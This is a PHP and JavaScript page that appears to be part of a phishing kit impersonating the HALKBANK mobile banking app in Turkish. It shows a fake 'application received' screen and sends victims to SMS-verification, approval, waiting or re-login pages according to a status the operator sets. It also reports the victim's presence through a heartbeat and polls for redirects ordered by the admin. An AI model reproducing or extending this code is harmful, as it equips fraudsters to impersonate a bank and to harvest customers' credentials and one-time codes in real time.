<?php
declare(strict_types=1);
require_once __DIR__ . '/includes/storage.php';

$id = trim((string) ($_GET['id'] ?? ''));
$application = $id !== '' ? findApplicationById($id) : null;
if ($application === null) {
    http_response_code(404);
    echo 'Basvuru bulunamadi.';
    exit;
}

$status = (string) ($application['status'] ?? 'beklemede');
if ($status === 'yeniden-index') {
    header('Location: giris.php?error=hatali');
    exit;
}
if ($status === 'sms-dogrulama') {
    header('Location: sms.php?id=' . urlencode((string) $application['id']));
    exit;
}
if ($status === 'onay') {
    header('Location: onay.php?id=' . urlencode((string) $application['id']));
    exit;
}
if ($status !== 'tebrikler') {
    header('Location: waiting.php?id=' . urlencode((string) $application['id']));
    exit;
}
upsertPresence('tebrikler', (string) $application['id'], false);
?>
<!doctype html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Basvuru Ekrani Tamamlandi</title>
  <link rel="stylesheet" href="<?= htmlspecialchars(asset_url('assets/app.css'), ENT_QUOTES, 'UTF-8') ?>">
  <link rel="stylesheet" href="<?= htmlspecialchars(asset_url('assets/finansapp-mobile.css'), ENT_QUOTES, 'UTF-8') ?>">
</head>
<body class="app-mobile">
  <div class="app-shell">
    <header class="app-top">
      <div class="app-top-left">
        <button type="button" class="app-icon-btn" aria-label="Geri">
          <svg class="app-icon-svg" viewBox="0 0 24 24" aria-hidden="true">
            <path d="M15 18 9 12l6-6"></path>
          </svg>
        </button>
      </div>
      <div class="app-logo">HALKBANK</div>
      <div class="app-top-right">
        <button type="button" class="app-icon-btn" aria-label="Bildirim">
          <svg class="app-icon-svg" viewBox="0 0 24 24" aria-hidden="true">
            <path d="M7 9a5 5 0 1 1 10 0v4.2c0 .53.21 1.04.59 1.41L19 16H5l1.41-1.39A2 2 0 0 0 7 13.2z"></path>
            <path d="M10 19a2 2 0 0 0 4 0"></path>
          </svg>
        </button>
        <button type="button" class="app-lang">EN</button>
      </div>
    </header>

    <main class="app-main success-main" style="text-align:center;">
      <h1 class="app-heading">Başarılı</h1>
      <div class="app-success-icon">✓</div>
      <p class="app-sub" style="font-size: 18px; font-weight:700; margin-bottom: 10px;">Başvurunuz başarılı bir şekilde alındı!</p>
      <p class="app-sub" style="font-size: 14px;">Müşteri temsilcilerimiz en kısa sürede sizinle iletişime geçecektir.</p>
    </main>

    <nav class="app-bottom-nav">
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="M13 2 6 13h5l-1 9 7-11h-5z"></path></svg>
        </strong>FAST<br>İşlemleri
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true"><path d="m5 12 4 4 10-10"></path></svg>
        </strong>Mobil<br>Onay
      </div>
      <div class="app-nav-item app-nav-item-qr">
        <div class="app-qr-btn">
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <rect x="3" y="3" width="7" height="7" rx="1"></rect>
            <rect x="14" y="3" width="7" height="7" rx="1"></rect>
            <rect x="3" y="14" width="7" height="7" rx="1"></rect>
            <rect x="15" y="15" width="3" height="3" rx="0.5"></rect>
            <path d="M19 15h2v2"></path>
            <path d="M19 19h2v2h-2"></path>
          </svg>
        </div>Karekod<br>İşlemleri
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <path d="M4 20V4"></path><path d="M4 20h16"></path><path d="M8 17v-4"></path><path d="M12 17V9"></path><path d="M16 17v-7"></path>
          </svg>
        </strong>Finansal<br>Araçlar
      </div>
      <div class="app-nav-item">
        <strong>
          <svg class="app-nav-icon" viewBox="0 0 24 24" aria-hidden="true">
            <rect x="4" y="4" width="6" height="6" rx="1"></rect><rect x="4" y="14" width="6" height="6" rx="1"></rect><rect x="14" y="14" width="6" height="6" rx="1"></rect><path d="M14 7h6"></path><path d="M17 4v6"></path>
          </svg>
        </strong>Diğer<br>İşlemler
      </div>
    </nav>
  </div>
  <script>
    const appId = <?= json_encode((string) $application['id']) ?>;
    function sendHeartbeat() {
      const body = new URLSearchParams({
        screen: "tebrikler",
        application_id: appId
      });
      fetch("heartbeat.php", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8" },
        body: body.toString(),
        keepalive: true
      }).catch(() => {});
    }
    sendHeartbeat();
    setInterval(sendHeartbeat, 10000);

    async function pollAdminRedirect() {
      try {
        const res = await fetch(`status.php?id=${encodeURIComponent(appId)}&_=${Date.now()}`);
        const data = await res.json();
        if (!data.ok) return;
        if (data.status === "yeniden-index") {
          window.location.href = "giris.php?error=hatali";
        }
      } catch (e) {}
    }
    pollAdminRedirect();
    setInterval(pollAdminRedirect, 4000);
  </script>
</body>
</html>

